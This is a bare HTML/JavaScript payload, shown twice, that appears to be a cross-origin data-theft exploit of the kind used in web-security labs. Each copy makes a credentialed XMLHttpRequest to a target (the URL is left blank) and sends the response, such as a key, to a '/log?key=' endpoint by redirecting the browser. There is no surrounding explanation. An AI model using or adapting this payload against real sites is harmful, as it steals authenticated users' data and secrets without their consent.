<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>

<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>